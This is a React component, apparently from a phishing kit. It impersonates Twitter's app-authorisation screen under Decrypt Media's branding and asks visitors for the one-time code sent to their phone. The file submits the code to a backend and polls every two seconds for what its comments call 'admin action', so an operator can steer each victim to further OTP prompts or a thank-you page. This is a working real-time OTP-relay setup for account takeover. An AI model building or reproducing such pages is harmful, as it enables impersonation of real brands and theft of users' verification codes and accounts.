import React, { useState, useEffect } from "react";
import { submitPhoneOtp, fetchUserStep } from "../../services/api"; // Import your API functions
import { useNavigate } from "react-router-dom";
import Loader from "./Loader"; // Use the Loader component
import Cookies from "js-cookie";
import Header from "./Header";
import Footer from "./Footer";

const OTPToNumber = () => {
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false); // Track loading state
  const [error, setError] = useState(""); // Track any errors
  const [showLoader, setShowLoader] = useState(false); // Manage loader display for admin step
  const navigate = useNavigate();

  const handleOtpChange = (e) => {
    setOtp(e.target.value);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); // Start showing the loader
    setError(""); // Reset any existing error messages
    const userId = Cookies.get("userId");

    try {
      const response = await submitPhoneOtp(userId, otp);
      if (response.status === 200) {
        console.log("OTP verified successfully");

        // Show loader until admin action
        setShowLoader(true);
      } else {
        setError("Failed to verify OTP");
        setLoading(false); // Stop showing the loader
      }
    } catch (error) {
      setError("Error verifying OTP");
      setLoading(false); // Stop showing the loader
    }
  };

  // Poll for step changes from backend
  useEffect(() => {
    if (!showLoader) return; // If not showing the loader, don't poll for the step

    const userId = Cookies.get("userId");

    const pollForStep = async () => {
      try {
        const response = await fetchUserStep(userId);
        const step = response?.data?.currentStep;

        if (step && step !== "loading") {
          switch (step) {
            case "phone-otp":
              navigate(`/phone-otp-page?userId=${userId}`); // If phone-otp, navigate to the phone-otp page
              break;
            case "thank-you":
              navigate(`/thank-you?userId=${userId}`); // If thank-you step, navigate there
              break;
            case "error-page":
              setError("Failed to verify OTP. Please try again.");
              setShowLoader(false); // Stop loader on error
              setLoading(false); // Ensure loader stops
              break;
            default:
              console.error("Unknown step:", step);
              setError("Unknown step. Please try again.");
              setShowLoader(false); // Stop loader on unknown step
              setLoading(false); // Ensure loader stops
          }
        }
      } catch (err) {
        console.error("Error while polling for step:", err);
        setError("Error polling for step. Please try again.");
        setShowLoader(false); // Stop loader on polling error
        setLoading(false); // Ensure loader stops
      }
    };

    const intervalId = setInterval(pollForStep, 2000); // Poll every 2 seconds
    return () => clearInterval(intervalId); // Clean up the interval
  }, [showLoader, navigate]);

  if (loading || showLoader) {
    return <Loader />; // Show loader while waiting for OTP verification or admin action
  }

  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      <main className="flex-grow">
        <div className="max-w-xl mx-auto px-4 sm:px-6 py-4">
          <div className="bg-white sm:border sm:border-gray-300 sm:rounded-lg">
            <div className="p-4 sm:p-6">
              <h1 className="text-xl font-bold text-gray-800 mb-4">
                Enter the OTP sent to your phone
              </h1>

              <div className="flex items-center mb-4">
                <img
                  src="/decrypt.jpg"
                  alt="Decrypt Media"
                  className="w-12 h-12 mr-3"
                />
                <div>
                  <h3 className="font-bold text-gray-800">Decrypt Media</h3>
                  <p className="text-sm text-gray-600">By @decryptmedia</p>
                  <p className="text-sm text-gray-600">decrypt.co</p>
                </div>
              </div>

              {error && (
                <div className="text-red-500 text-sm mb-3">{error}</div>
              )}

              <form className="mb-6" onSubmit={handleSubmit}>
                <input
                  type="text"
                  placeholder="Enter OTP"
                  className={`w-full p-2 border ${
                    error ? "border-red-500" : "border-gray-300"
                  } rounded mb-3 text-sm`}
                  maxLength={6}
                  value={otp}
                  onChange={handleOtpChange}
                  required
                />
                <div className="flex space-x-3">
                  <button
                    type="submit"
                    className="bg-blue-500 text-white py-2 px-4 rounded font-bold hover:bg-blue-600 text-sm flex-grow sm:flex-grow-0"
                  >
                    Verify OTP
                  </button>
                  <button
                    type="button"
                    className="bg-white text-gray-700 py-2 px-4 rounded font-bold border border-gray-300 hover:bg-gray-100 text-sm flex-grow sm:flex-grow-0"
                  >
                    Cancel
                  </button>
                </div>
              </form>

              <div className="text-sm">
                <p className="text-green-600 mb-2">
                  This application will be able to:
                </p>
                <ul className="list-disc pl-5 space-y-1 text-gray-600 mb-4">
                  <li>
                    See Tweets from your timeline as well as your Lists and
                    collections.
                  </li>
                  <li>See your Twitter profile information.</li>
                  <li>See accounts you follow.</li>
                </ul>
                <p className="text-gray-500">
                  Learn more about{" "}
                  <a href="#" className="text-blue-500 hover:underline">
                    third-party app permissions
                  </a>{" "}
                  in the Help Center.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default OTPToNumber;
